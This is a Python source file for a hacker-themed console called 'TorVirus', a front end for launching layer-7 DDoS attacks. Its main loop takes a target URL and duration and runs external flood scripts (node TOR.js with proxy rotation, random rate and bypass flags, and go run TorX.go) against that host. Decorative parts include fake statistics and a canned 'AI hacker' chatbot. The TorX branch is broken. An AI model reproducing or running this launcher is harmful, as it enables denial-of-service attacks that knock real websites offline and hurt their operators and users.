import os
import time
import sys
import random
from pystyle import Colors, Colorate, Center

def load_data():
    return 0, 0.0

def init_data():
    pass

def progress(curr, total, bl=30):
    filled = int(bl * curr // total)
    bar = '█' * filled + '-' * (bl - filled)
    return f"[{bar}] {curr}/{total}"

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def load_proxies(fp='proxy.txt'):
    try:
        with open(fp, 'r') as f:
            for line in f:
                p = line.strip()
                if p:
                    yield p
    except FileNotFoundError:
        print(f"⚠️  Error: {fp} not found. Proxy connection aborted.")
        sys.exit(1)

def display_stats():
    uptime = int(time.time() - session_start)
    mins, secs = divmod(uptime, 60)
    print(Colorate.Horizontal(Colors.blue_to_purple, f'''
    🖥️ TorVirus DASHBOARD 🖥️
    | 🛰️ Bots Online: {bc}
    | ⏳ Uptime: {mins}m {secs}s
    | 📈 Success Rate: {random.randint(85, 99)}%
    | 🔗 Network Strength: {random.choice(["Strong", "Moderate", "Weak"])}
    | ⚠️ Threat Level: {random.choice(["🟢 Low", "🟡 Medium", "🔴 High"])}
    '''))

def matrix_fall(d=3):
    start = time.time()
    while time.time() - start < d:
        print(Colorate.Vertical(Colors.green_to_white, ''.join(random.choice('01 ') for _ in range(80))))
        time.sleep(0.1)

def welcome_msg(bc, st, ul, at):
    top_msg = "🚨 WELCOME TO TORVIRUS 🚨"
    user_info = f" | USER: ROOT | ACCESS LEVEL: 🔒 TOP SECRET |"
    proxy_info = f"| 🔐 Zombies: {bc} | Session: {st:.2f}s | 🌐 Tor✅"
    level_info = f"🏅 Level: {ul} | Time Spent Attacking: {int(at)}s"
    level_prog = progress(ul, 10)
    clear()
    matrix_fall(2)
    clear()
    top_msg_scaled = ' '.join(top_msg)
    print(Center.XCenter(Colorate.Vertical(Colors.green_to_blue, top_msg_scaled)))
    print(Center.XCenter(Colorate.Horizontal(Colors.red_to_white, user_info)))
    print(Center.XCenter(Colorate.Horizontal(Colors.green_to_white, proxy_info)))
    print(Center.XCenter(Colorate.Horizontal(Colors.blue_to_white, level_info)))
    print(Center.XCenter(Colorate.Horizontal(Colors.green_to_white, level_prog)))

def display_menu(data):
    ul, at = data
    clear()
    welcome_msg(bc, session_time(), ul, at)
    print(Colorate.Horizontal(Colors.red_to_white, '''
  _____      __   ___
 |_   _|__ _ \ \ / (_)_ _ _  _ ___
   | |/ _ \ '_\ V /| | '_| || (_-<
   |_|\___/_|  \_/ |_|_|  \_,_/__/

    🚨  LAYER7 ATTACK METHODS MENU  🚨
         (Top-secret Protocols)

    !TOR     - Launch TOR-based DDoS
      TOR https://example.com 120
'''))

def load_anim(text, dur=1.5):
    frames = ['◐', '◓', '◑', '◒']
    start = time.time()
    i = 0
    while time.time() - start < dur:
        print(f'\r{text} {frames[i % len(frames)]}', end='', flush=True)
        time.sleep(0.15)
        i += 1
    print('\r', end='')

def anim_text(txt, delay=0.05, end_line=True):
    for char in txt:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    if end_line:
        print()

def rand_cool_text():
    texts = [
        "🌐 Establishing Encrypted TOR Network Tunnels...",
        "🌀 Tuning Low-Latency High-Speed Proxies...",
        "👾 Enemy Bots Detected – Deploying Countermeasures...",
        "🕵️‍♂️ Darknet Surveillance Drones Activated. Stay hidden!"
    ]
    r_txt = random.choice(texts)
    load_anim("Processing", 1.5)
    anim_text(r_txt)

def session_time():
    return time.time() - session_start

def chatbot():
    responses = [
        "💡 AI Tip: Never leave traces, always use encrypted proxies.",
        "🤖 AI Insight: Did you know the Tor network is used by over 2 million people daily?",
        "💬 AI Fact: In quantum cryptography, the future is already under attack.",
        "🤔 AI Thought: The dark web is vast, but remember... the deeper you go, the more risks you take."
    ]
    user_input = input(Colorate.Diagonal(Colors.purple_to_blue, "AI Hacker Chat> "))
    print(Colorate.Horizontal(Colors.green_to_white, f'AI: {random.choice(responses)}'))

def main_loop(data):
    display_menu(data)
    ul, total_at = data
    while True:
        user_input = input(Colorate.Diagonal(Colors.red_to_white, "root@torvirus#~ ")).strip()
        if not user_input:
            continue
        cmd_parts = user_input.split()
        cmd = cmd_parts[0].upper()
        if cmd == "STATS":
            clear()
            print(display_stats())
            continue
        if cmd == "HACKTHEWORLD":
            clear()
            load_anim("Accessing Global Data Vaults", 2)
            print(Colorate.Horizontal(Colors.green_to_blue, "🌍 You've unlocked Global Hacktivist Mode 💻"))
            continue
        if cmd == "CHATBOT":
            chatbot()
            continue
        elif cmd in ["CLEAR", "CLS"]:
            load_anim("Purging Console", 1.5)
            display_menu(data)
        elif cmd in ["TOR"]:
            try:
                host = cmd_parts[1]
                at_dur = int(cmd_parts[2])
                load_anim(f"Launching {cmd} Attack on {host}", 2)
                anim_text(f"Engaging Attack on {host} for {at_dur} seconds... 💥", 0.05)
                os.system(f'node TOR.js GET "{host}" {at_dur} 16 90 proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full')
                total_at += at_dur
                ul = int(total_at // 600)
            except IndexError:
                print('❌ Invalid Command. Usage: METHOD URL TIME')
                print('Example: TOR https://example.com 120')
        elif cmd in ["TorX"]:
            try:
                host = cmd_parts[1]
                at_dur = cmd_parts[2]
                load_anim(f"Launching {cmd} Attack on {host}", 2)
                anim_text(f"Engaging Attack on {host} for {at_dur}... 💥", 0.05)
                os.system(f'go run TorX.go -site {host} -data GET')
                total_at += at_dur
                ul = int(total_at // 600)
            except IndexError:
                print('❌ Invalid Command. Usage: METHOD URL TIME')
                print('Example: TorX https://example.com 120')
        elif cmd == "HELP":
            load_anim("Loading Help Interface", 1.5)
            print(Colorate.Horizontal(Colors.red_to_white, '''
HELP - For Assistance
CLEAR - Clear Terminal
CHATBOT - Chat with the AI Hacker Assistant 🤖
'''))
        else:
            print(f"❌ Command [ {cmd} ] not recognized. Please try again! 🚨")

def connect():
    anim_text("🔌 Connecting to the TorVirus Network...", 0.02)
   # os.system('python3 proxy.py &')
    rand_cool_text()

init_data()
data = load_data()
proxies = list(load_proxies())
bc = len(proxies)
session_start = time.time()
clear()
connect()
try:
    main_loop(data)
finally:
    pass